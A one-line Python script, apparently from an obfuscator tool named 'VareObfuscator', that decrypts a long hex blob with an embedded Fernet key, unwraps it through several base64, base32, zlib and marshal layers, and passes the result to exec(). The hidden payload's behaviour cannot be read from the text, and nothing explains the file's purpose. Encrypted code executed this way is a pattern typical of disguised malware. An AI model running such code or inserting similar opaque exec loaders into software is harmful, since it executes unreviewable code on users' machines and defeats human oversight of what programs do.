__VareObfuscator__ = ''
import base64 as ______;import marshal as ____;import zlib as __________;from cryptography.fernet import Fernet;import base64;__mikey__="aWl6NTZqNm45U0w2RXlYajZOQnNTUGRPUVhqajdackR1RHJsT0tId3NrRT0=";mydata="674141414141426b4d7579774d704f5a715135504f584c6c643344675730694a7a52534d4c5f6831726e44327a624f7259467358513379776d5a4c744854615a685f4138423445703942434b564c66557a2d5050345755765343534d31625768517a416e424c53415659714974573149336279767856634b696673305a43633262464937646651415339586673504d3336446c5753785138464e4534415f587569436e375879764646345f79516564484778557742516474563639753659314f5f714b7166313147344b5f5873496a555a426f326c3377656141702d72466a754f5445376843427342632d644a7a6677757a6552646568663739693030334a7869424b70706d587941787a44534d794835655f69584133454739425438666e34337a396d7a316d4d537035526e30432d4d5233544b46756d5162704d69364c674743624c416571544a447779414975553255645a31333879354451544f545f39687255717862376f334f757a544b7451327872376e4c65695563775271565368726273725279384e54584a646d4a6839346373687871544e64764530437668725134394f476a70656354484a726b58716f717766553345426277446e46505f4c4e486571736575536e534356614748527656454246735248633941695036497954722d33523959466750746e595476666c30706a595849464a4f566c76566c756b454d4b63597949674e325032396c6445792d33375f6e46554e6b4561627933434d5a7a774e456a4d79625065704c4d6138617953334b51786f474c4767725a433132455859345837532d6f346e7156545952716e4534654d4b767737526b634d6258383156536a454c4a3271646a6c655a6953594e6d75784458686e6f43466e356e4f3274675f6253426d6f694251336b6f563843356d444142616b69556f39555641776231415f4c6b67357a4839795a4b4d397748415437424169416965344a6e57414d3273506c756c51445275565658616d466a31434e7558484f4642486952544d4e2d68765536545f4f736d7a6d2d4d68577a46446f78442d53754c57434a394269616e496731634b47327a77535f7863375642714534614d366857726c534f3675724368762d5a414b5244716a45704b527649386d556a514d41364b51772d49494f726b4f456245587878786b315f63767261735f754c70774e4f682d756c78312d507a343359397a3771397330437673585a595a687173354f443376425f63544e6d6747653863504c316256596932584a41524c49526a47723148313632785959495372716c336965364a494f35725756456f6c36716a572d477a3453656969764d51396547544147584842784149707848755172335943714b594d424a706f42333438582d3130596a744c4842305441703150563274416158704f425a454e4541315f36504a36557072467266535768476b7870714158443447522d72515146584a4e6d4e38307a665a506a78546f69334b5678674e47683346664d7453795a4c705a4b43424e4a4550314c50385f565257586c707a486d6367336c4f5268325a616c456d424869576c4335447279463276685663724c3565745a4c745a33434261585a7072416852744f5a75414b5857363542376857355a5774366867623659676d63612d67415734505164386a48624d316c484e594f4a564357415079724c52543234626b7635733351496b394e736f6f705142796d49424339663141684149656d7134366a667a6d5a36444e512d7745436c6b416e5345726c5f504158634732336270365a47494878564e616d5a553272546a58684f5441462d4a43796d773862416a3073374742415a436c7a4d656d7361476d326544474472746d2d4a6a715452523949694f75314b474f6370353879335854586c50665f344c69504c42565758656b544e61764d384b724c76315255776739346e32766449306d5464436d39724a735346595a5149674a7869417a717442416463624f37697138637279485f71593134646c782d494b705f62634b59316e6f696551507764647163624a6c6234575962663950364576704f4959786a666f4e4b436d45375f436b7177656b5a682d54364e4f4a4f466334504b562d5971745f43646f3973424e47712d68614d334e504f444b6a434c726c505a5557317762314f4239584d49572d5447356f674b6e71754b6770455f6a676267394c53494f336b584c354c7573387956744161554d49484a65433452635933346e474d6142343852573963424770644c736656736a615647586c31525f697a462d684c647a7748324e764552504c3675457637345f6567746b6f385f58564e5262774378576563636f6e5468766347765f7557396f5a6930756a30304b767356476f70563463705149703750494b323778567677753944685f3430764855547a666b717565555749656e74694e344d4f327074577758466e6c714130736c4733387a31724c6f6c6939757547462d5a4d58596a524c646a586d654a4f6a6935446a6b7364556d554b78537438616439626e3163674d674b2d4f59796742716273614d484245416c48425139516f4837747679373039444530484959515f4a38485f75616b393855762d63344d4745756b754c6b34595533766751387543376f544b7a396e6c79766433334a556f5a5261524f68347a4c5046427a595f32543763444f48394e5a774a6f586151416e732d4f4d31473048427358307a6261623666344347614f517773554a4344434b4736454b6c767a6d46757974336f6b656864316f55794a4439593130753249664e3332665f4943624436385a744a755f74502d363652666848575a495a53363352524a395a6957395938325f466a646775706444345147346f34763875316f44486f77315a4a4834313178455266346a7a34646375395467433530776b51767461655444363667706f58345439536a3964764d39756f796a3835475551586e6e2d6651787676595a62495a386b42514c6b746748596e647233756a524e316967372d7871736f48707153535a58616148352d535464416845346c365f686145594f564d31386f6e612d4f6d486d474651794258395646522d69556b78356a4d494a476546395279555a4367726f584e36386155744d5165592d514c47664256597558565457493061763034654275666f6b4a6d35366a4e57623479444e474462627a645f35322d54525a35744679504b5272466746656b74566e68672d74514e7046375137356d4a79554570397a6a746f75486357654539355354644e3458676d68373175537876463554473151637744735f61333273736a635259375963566c343031502d505135736e3342736b4b6f73526b6f6c3346675371776e74764c45335f65786a5069414c7667416e57714639337148706a524c7a426c5a6f796f5a49484b4e394c35672d6f62736e363766356e5a62357a78486d6f5f5770565a5453425356764766664977766f6b594b6f594b51533337446972556c6e7456785430417634463661696453614671725147344571673179757748713054474e3234446d6e7a70616132534c37764b7557774d5647446e66756a36497035574b5a77566f586654614e346b34314f49354f615678317a54784850347337303638624255766558472d363535374645576950367656304c4f444a5f69665665616a626933666244363655426d514e4d68394364695a427356626a36447a30477136342d437837776d4d4869524a424c4859766b505f6730674e62626e51477466786341763536545436505a4d74564476302d6c535839354b683679384845527848364e71527552566c41694e4d495a4549314a52537a357a44676d61454c307458302d6f634675474d6e664e5532343632746a5a5f514e4c7279696f3243456c357534533747616d5169614e38516b78714b356c54335665704f315a7477494464366a7832466b6d737a435a4c4d57542d614b5f58703938504a7736775133327a4d75667a63485646574f69394e7a733136487046776c6b4e6b6279756e6c63467339485f53453937782d6a56636e4864723235434643354855716668437273697845724c4547514a722d5959374e2d4179776d556535354c4174644b4233586b35333751614353744f6c707273767a715034424d6e5433757a43597330775956746d4451555538436531744650305f6e4b7449625053767738496974653344753354745431706c4f5a59355454676249466531315366457a776d7a6672726e666547394c45792d6a695a6379714f784843364a6573594d417a4a4944523638383646514d4b4b70304b3046534b5847616c786c5a727672752d426b7470715f334b46774a5577422d70387655734c41636e71756b756d4846567a386d7362344154793851414e6264487a754d4b386e5930304e4d696a56424d336f5a7a4c4d6a5275345861596545656c4161745143713231456b4c305f48595768674b55395f4851444a3959574965794569435730474777563544647438474b734b664a494f4d2d415a67613037574943584b52365572303035644478676748685a42734450306678654a377772525f74786e347a6c6e796370785877794f6c49493637486f4a6b696d5872364f475637616c51714e5a4d68723359315262517957302d73587270344d4570326e3857764c62676a6e4c6837775a355078626777412d6e384174686842716853495646344d2d2d6b586e3977545f3072766c736e736246657677435272302d77356875576a5564752d34714432467a4969377530376f6934726a454c4866626d31655036764167502d517435345f70563263536d446b683356367651693756793966783575465a5a4634674d575952577971436f674a4c7a5755624b774a68564831764d43334779314350594e3259526e6b524b6b4f6f525275444751383361307a522d58414e384b4f49396557786d54506e6d4e303363473244356350697138737432563036764a48556e326f6d776b49524c4565772d68364a76354d4871663267515a64516366615146645f5a6d5a45614c42724b786f7743654562576a4267645f62345171464b6e685851375a74306669503974616842394564704747724670344772347a5f6b627852474e6a746157325849666e4b626a4f7461346832307547306e314a6851665638535645416d6e4932624b6b4265374a6963576672576f63742d51764178616c7351695f5945494b6f477641344e6a5451634e475a747756785a5f4d315444486a6e476f6c5230774d486744733162415743305451594f79524c55356c4c6b68764467544b566c75342d67712d4e6f5065564656327151386b616d416b416a45737449422d4b554f364e664a3838737a5536534f325753444a51666d645169315367575a5264384e516f7248546b453979532d643075474d423864683536545a655242474b69476b666b4330564947464b5a55726b5045516b4f566575574a453251484a7535734e545261707855627452336751596876624e69396d4b7a533255795a6f6e466a574e337a58734f58637062766470325f616e664f52384158383856374648334647475f787762492d586569457a4c36464678506543644b7251735f53597135744b5a644f59755852686a393975346b486a716835724d7652482d50327432454f7a4e6547324154596b727530555147614979546c5939694b4a4f6b7656547052536b4844716f763434487365676c3053796d6d4d585a6a656d3161575a475667304d76436d5a516656325f7a356a4e6b547a626e70775f4259784b484c4d354c51375f6d6e6132305a65543933494f55774d66344f385649324b6f625a37784265705f7878473948695645734647776f5364796376445035504f7333747071444d3655666c614f576e31747a5f704239354f4b70766731597a6531577568417a6c5873787652616536536e5a5631445331625769704d6b354f65617a37504c515f75773476623969646c597932457034587153424c565a544c61543454344f787537305978375a4d5f704976587048326856466261587a34755f42763449794a772d42584b42485466577267356b4e4d4f524e46676a647a39357346714347656f56786c50496e744f36622d706b774f493876455f2d7a5f6841444b7a306a3562337468634b37386d756774476970377a563475736b73454344476e3469556d5332637375345a4c6c36585155794c48784b55766f43494b7443644e424879336a64636e4d3457724a645f454a376b6a535a6b3964487835304456483757317173704a705977396d2d5957395f6d475a5131713542564a512d467774647637376452764372323377324e4b797670694235685978394d5a37397876336a61473537554b736268627330313861337a5630517065535a4f656f61412d75566761665354674378716f79754653343345354c6e5f5f6459306c74384f5368566d5a6a4d6f33344f695f344b6a565467317138686e56373475544f526f62594d437a5a544466756a344a66425848755f584b52484866512d6a4a6c7a436f5a795932645737576c555f57476942557951644c66395f486c3757636e47703543444f395f50716a4f7366703973436b62667a736e796d745039534c79594745705449556b46394d4f794c6842336b683246734b6550486255366b4b697634627055614f5a76515431553566386c6d2d5f336b385a684f376747505775797544653134525f793567304547424a474d704950456558732d42756a2d4e516848524e4c6950514947676875306b7776674266324f55374a302d3079355a6631724d56734b6b5374495f65675347494f36616b634c336b4c2d475a34466149756b7466466a6c474b6e7064765a70634579725a4139656533376548645372784f4e5a6572616c4e644d736967553767324d694c744668496b57545779355a525472794d35455671617047746a70526a6e4b385872763651725546726b306b4757314c32383638625135485567614d336d7a396c47505258475369785f45614c41626d5947564e654a47384f39634a4952646862766f466e6c64616e6d444361657553706c6a4c7a45693859335670657a66596a47374a57796a32363672345f526c627246304368576a62304576557578515549706865565f49787230556c667738776f646534474a525f62786734586a4130344b65544e6d6947554151465455394b31736f5636646f3048587267535675387a6f51463042734a5a6b44386d7a6c5259724978423447705a62684f4d414443453374776c33315349716c735a436864525f695332546c6a7636355634574475764f4649384c4262566b5a5455675742757162473248347a6f6a517935654e43577a6a616e2d6b64437a44536c7667495644787565505a6b6b68594b796137527863753570704675432d6777326841475f754f4a7954766d35583950396933356630597a6a72615330793869306f67676a31716a72436f4d686a5a424c63796931586c68396c774f41334d6f2d58504c5a78423657445661415f566266624f524745704f3867765763383959414f447930305f544f6c3376785569737859725f396149345132685572555275567532394a444d674f56396a676a587146594b35725a3352776f656c5675545973564c2d586a55485457374e46634f3937377742676e3530464c41567732792d57423774636965752d6d394645726e5a67547570305871447743526b6d3867774e74394e6a7165766a6d5345467971754530664a545a71736c51524d396956454b627a7470653663546772575138445349566c6a3953732d6e35583851637a6e357532393134674870614d74374a524f717463474c796855727375484e4c736d614e61692d6f5662736f4e556d68776a4955363665525665596d3876375042352d6e456b54694c30735165574b673535786373535a6a6b78486e6b6d5a32396b43634f625458334b562d4f4354743941496e6e4f336642757169494155655162633358575a63624b774d394d7157464a6d6450355558743744687957427361444d50786f4b306d31674937367a6c646d70327939327255344243434a52757351744e4f6a49685851326d36695144306c456d624d33547848417750704f7569464c70744e38665f5370624f6678737a56595072684c53564f714d49596370726a354d687a5f4a354570786556676452334c61704c4e764734796e363976644573724d6c784a466c5f6c42374d5746645a6439337a515855527532674c34486a59504e5f493850785334793970345748315a72366d344245474a4c45714773446b63316b4f5661794a396e364a6a6439395851542d4572583555393052644e612d2d324575552d706f7a4671624872726449495f626c4a54754f69454a54544774683453496e6e5a43466b69726e423739424c31776b4a364e6b534d49374a4d62506b72764b5f4d656c567771686d55464370716167515939777748622d4a3573545641446c322d53384d4a41736579737742573879434a45555252562d6f78704a695a5f316f6449704f6d4d6c312d743068707452525767734850393331466c674c5441315138355837584f6e4874675034456f6a765266556742754c4347425f4c73516e624b636b4a595f6459436d5656346d32766576723036486f574371535f465a546231304c50676c67485643583874537a367a6d7662564463684455485637624d77746c6664415934677537794a6945797347365f4a7142394b522d34333476755771576a7751426b704e585356436e79786b464e3361676c786b75376c7137487a387765376b65784c48734c3153624e42386d5762734b557046736c64543549656d35324f7a726e4c72547352326234745159624c414775366d6b6248564e59376375315676657a6230564d75727767614e5247757371765a354f504f357574685733632d48566176674a686d6742564b715343654b5f514839745858387a34557a347178772d5f56466e556f497261365630484946733733766237776b3851576d6b6559347a56474b306c52713148444a774948694f766330594158354c4e71444f4a516f71595543514b61535567514a6366426f7a486370315a34785656704e4344772d5569464c79446c4543494d5742535869596d675248616b734978354373724d767a6b645a30357870774843756646474d47324e4a2d515473746f6675326e504668646b6d69796d414f546a55546a78642d5578625341524b364b457a75687334587754386c674467387a4e595a485176453052775469446961665666436c466e4d65486350446d67534a413144612d386e743678622d505343706d686777674b57764f4e3266793443597a51567746487475644b4f61586e546a6b746c4a565561505272566238766554714e42534f4951795f62706741374a59694d46677a64324d50595836335042434b64357a674347486a5950355a38727535722d45536262517864705935665968506272644277724e3562754e355a524a57507148507369656a705a344d75354351774c45425f383634624b446243414548307371795a413175444a773835376d35566d58453430677244775678426b5a2d6d7577316e466f67546f69794a65387057343637534d4d736a696c546b5a645552495a61545741424e6f3871706f515039686f31395f395f69715965355f2d6b336c415032754841756a78334956734955635457685565444f4258516f47566b5757337755566e316f356965493467744663486f4e4736316f313179372d785874596c5a34455370584e64356a464e3134506465544951634769676b3747487a64694762366664774e63386d64646b70525f724c435247786446364137385a526975414c53575a45344a4254575a754f78423851497871426e6243476f735575382d7843305a6f4c56577567436868315a4e437973465f54335030785673426661475a64644d4a425530627168735f6e724a3074364b7a633274686f6877716c726a3962344e4a496b4e4658706e5942756b61534e67445a6e4f71714130684b7a74346a5578594833664a4b44734a5f385f464a4167526765344c4d676a314a73794b44414b365a55713569774c5538654c685a6b713775525237583268784345573341466263634e785430716a677a4953646d50544569574d746c2d76536b6a634c77516e454d723979376e6e6c544c717743425f2d6441796d624f717676663461364a4f6c5068514d686a39455f4d365750414a6579486574352d2d663252484a56674f6c45375a3161474153717a4e686f75784759675158417a4d6c326b4d77684e355154536a443149564b55306d63665a4a595f4e30474a72783442434c575867546b6f366c37706638614f434c695f476945794470535a48575f4f366451774c6c71356f794d6941504345572d67386b442d2d47313052765f30546b45656379715f516663766d4b7539434b7553645a4c33774d3232445f627a3359744b7a42372d734c5364774f412d774f634d5f355370674159704c49764e7943736c4f545a6c4667624a4d3149735743316a49566936654d4f72755156793041754d776f7162635073392d33627a6c48554635615453726579646b694172746d573648695f6c7a5f6342676d6a6439425864657145687936517243716c6642714a593343526164395a646a6d5249626c6d4178346e775179416358713167576f634d534547735976736b6f76716a6d717a717754767633625f765f536d65497465476a6c38703969326f4f4e4763794d365042347456445a46776d67326d596e5437314d743772536879792d564d446a364d62317833646859626262776f5765427776544b774959385f46447139396731585a69527a556370765061315773786f4f644935755252354a6244795a4b7a68683064634d4f766533436d416666776e6249764f78444e6e584e6f623368744d7a6b472d6b47794145456e44516e684b3361382d306c4e68386366495159664534685f4a78755276703174445f39357938693532436b377267756f2d43487875493842567a7168323170655970462d39713634546b7771366d6e5a485a716c5862707563494479554137427539435770466362426c76374e5a5a4e766566634d75736e5a794a314c764165467078425f6250564f486e796255667276546a6456786b32573255362d6337487843707031375475663758484f32435a4379695f4f384f333238556b305071594d37736e7368332d6f554851766c3166337643565f4c7a494959706d6378566d6e6e3033784761317a4f5673515a5f3246795666316b767862634f4a577830414b2d77707954796a544d6b67323965766e4f34634b4d4577655064616c707435345655577132554d6867697a6f79745a307051706c73515777576b516c765842323752485a48504b3233616b324e345a496f64675f5671626c4868794872654d4c4b736c5a6c4d76594f39437a344e4e4f63395a7a3851563050635f7a5377664e724d7472363279484e747a52724c7834334c356e6d6b596f61696e67565662694c646a3249315a547443306c5a4f45666657446b46675038415a484a766a723168657072736757495945335a2d486c694a61535a385a4d67424a694859714e4e354148344753445066616d6c49597a77754c616178683047317646636b7870594c4d73546159434c655748394d465233615a3154322d615749386455344b434e3138584230587256773057597267523565595350656b32385766667550516b47555a3033504a736b776475766a54527a3433506d6967466d355a4b413470414b4541536e397876577430686e50773945666b5a6234444a4f6e536777565939325a544750366a576a72464b586c51465f4a79786e565739656c5f64346d387870594e367669675a3039745137722d4a4b6b4c72306770303955433643314c34546a31312d516d49315057777333324d68776548546458716e79487558723564434e58562d705f47466f5348396352534c574e6b6d7a533041355f53714c73654e4658757233305a6b6841506535676f74756563487a736946766446566734594a794570775f79486e38496b4358513669774a645938506f77433338386835745064715848627475764762674662466b502d694a3674562d736b5863345a326134727256556a34614c5a796c45667061454a4d5479636f6342395673387635704754306d5573364e306e387676336669674c784e3957764e524632597579523155374b343979472d6e43614a5a61626c4d3466574f6b3050786263746b616237787249625359763162346f6c474c6b556c5f53336b4d75726b496f7175745137794f5f4a744d7773766666455337552d7738797151343238704a432d546a36746d757a69326c79394f66724f336d6c6c352d316b424f41475a4f44517444724344624f69596a5a622d50494e69512d452d6f346d30516d4b6547346c6f77516376796a37304e4971574f487a6373682d6b566f46634662646157546f64355536576159672d423362552d6d704873434361374b3551464236644965676b69784a67594341397371764d434a66436e644c45333341782d5570713552416d53586b377066477a395661316c4772474138507a6c5a6f6131584f424563704f3037745f53636957424368686e33654b5144376d78693042766255347a636e4541426f4c73497730694f32616e474c545248766f34454d4f7050356f3462453347626b49507150674339514b5479494d5039664c62687a4173697570736572767535675f4452534b32574e677934463761325a5747653148554e594e61595355546c68394144545a5f6452476e342d4434566f7a4c38664968326853396a6e3558717a4b794a3461537a6744547039476c7567635462716b6c64784943636f3572643458314f4573785f4c395f5f6c634d464a7a4b7470706662416a484b307a6178585632496d42674b4168396f787761447673514e6b4343574d575f61585242393278477857677779674b7a373531567279374c316e5a4c7841336c75656268356a3667567652504e6d544e6e52586d326e7434796b63455764765f73644944422d30746f78634c4454633347485873727162685465534e393743747571776f77454f59725f337030485734314b34583263424d4a4f4d664371424c44686d6b7a506d49656f384970796d64566c46536f514371534b666d5a536f483446565a585257647a7733386e6a73777567756d4a513370387847317059424446324136705a784b5a53447278673051597a61635a376f6e616a5f427759746237362d79384f796b2d3654795667706c476d62582d596c346a4a757244516f505a57502d70776a4b59485238345a6a7175787443634a4f6a784843366155656f7975385f426c32302d4c4a5476357969792d4e6b424e5a747a6839582d4e786472484d476a4c7833304a44357762467548786161616353704c36742d555f44795a317a4f694e6159627557647a6f354639754c593375634a496b576e4f6c774e6166677836525359365245786955477451416e626f704a653875496437523549577a5a4f5468617634486761516d7854574867733758536c49545a4b6d4877785835727a426f6e56744b4c7245624f3669626b626c696659324f53463376786f7a693273524b646d3777712d54484e3674725f4b314c353934714c69396e5136665772535472575337306c656a695a42743371434e566b4f525f432d756c3567737a666f6a776165767a495941304f4f754770587867354f486d4749585a486b317a32534d596a703644496e79444a3478695136453570344a6746534e387350474e79783051743746506652514d475f4f73797270427676647a47577238764159594d3253363655487058736c7453554b347a38747438523849344d7076706639666b31382d795f4b6f61354e2d6630424a734e586d446d514f79414870504a77334c6837784b797948662d376d41697759614c754f5537332d6e72354e4264624e6855346d6b6647664b4f48642d32754f4d334c726938526333306e5f567a3161646d46633161766a744d4f77656b6c787271755547786d5963496933416b45625759696a765f722d784c687a3271634a6874326a354f5776586a347167746831612d6c703662564c474c2d664b737a544e6e684a6b385a34594b517965766f3150754574336f5257426d44795159666573746730674635397067544d6e75324932455466415750314c544542446c587542525732644146576e6b376e77756d65317267584f3057464d59774d434f495675786f6233777478614f6e5372796f6f742d716d38684e307958427567637173486e543631333878764b53527841666659486235616c68624b6b4c6a706b5752532d5f6c373252596d4175765149795870755751734f7a67467348394f45796246764953797a4a3774536f4531465337426f4f33595861367333324342783247466a677a6c674a74794536626a31376463554c554f3264716e75752d54776c58477057733936574c39733879626c414c71354b626b5a68565a757659795a34524f6d5f3641436a62614b55397056525a6b37674935304f56356c7a617a6161497137642d6b696e514a76753135585a597741384e386b47635256566c504c55343262576b36717a584c74694d3569794e5257384561494b72584c324c61494b776c5f67416a7a426f6c7530657975556e6a6d495866434e506259656e645658344d50315459436a5639624358392d625474385f364a465f2d6d4c6f32796c6c4f4b2d545a6b6b727353504c5f6b71357650644c536d58435771787167674a45566d4859374e384a6f317671436c3667626d7263794a4f6c754e3655527a53354661506d414d6d78786f67325456734c5453374250457957726b334b55357a6d6e46587a503332416f5f4c775a6d6636446935726c6475783355324d7a444a646c366a6c48753564537146396669316e716248524f31573379445a6c61666c7a595a6b68365168634e2d735670695439535431465156556565536c4b4e6b4d4642384971774f31577939344b5a3033316349497368326d6a666d43774e3469465a4468725930585f694732527645744e4d713847336179765a344f2d7135517032325958704979756b4173324552484d784b644b6449324f556d4231457445477839576a4d562d66617a41665374446a525768665f4d6f6b302d354c4f6377302d48555745326879516c4879685964414a36756a7a6241577a7472355f79574a52363549594f734f777371726a6d2d415277775670666e3552784a79703456466d53696a396d316539334175775765356255425230556a346768674f724c5078342d436f7736635568525476616c4f4a746741306f6b426f586862492d4b3536795542634e354f734a4e394b6e78304b79364d5f644b645079666e7559515934434246503848726f5f5f6f2d52564b4e61323538774a4b48704431314c51433841454c5362504b5576734a4245515f5f71773948764a66785f32305331693462346f4143324c31575a6836346a7a7059746837476e683148452d34446e7161766a75733451574c356b714c61466147376e6f646162305f6a517636306d314f455169562d4f737a744c2d69616b656962645f3367335a55304f335264725a3441744359553158726c3339634d69476f64763961637770306c462d724c773674344147535651473677357a644f436c6c435373486d6b78777449466c306f6e544865325a464a684a7833716736596832673637684d7535682d38316a7135425867696c48647875634973466f4e4467684b3851546e2d342d5271795f7432494656443035525972495a74395f584d33456f4347304178462d753563363851474b4b77645f73705f384771513775327969376976524432527867306f3173324432562d473448624c5273595459757272645f4e4234365670776e485f64506a695a6976684b55757930546f50552d56504b554538763847577559786357347a48653073616d655f4f6b6257387563655a633251334a79507a61384b426637685678446530354641786c38534131306f796d446242642d377031787931563764785673394d437a486c6f7a43367230515f414545636376746b316b5565493850534b495a495a3655704c49446775666b5a2d78625f7747582d73546b69767673736b45737673774f4a71544d466d73466e3450574e63476f5f51725264797551513d3d";__vare__ = lambda x: ____.loads(__________.decompress(______.b32decode(______.b64decode(x[::-1]))));__mycip__= Fernet(base64.b64decode(__mikey__));__step1__=bytes.fromhex(mydata);__step2__=__mycip__.decrypt(__step1__);__decr__=base64.b64decode(__step2__);__decrdata__=__decr__;__gotnew__=base64.b32decode(__decr__);__newdecr__=239135298315;__getnew__=__newdecr__;__myb64code__=base64.b64decode(__gotnew__);__myb64codee__=base64.b64decode(__myb64code__);___ = __myb64codee__;exec(__vare__(___))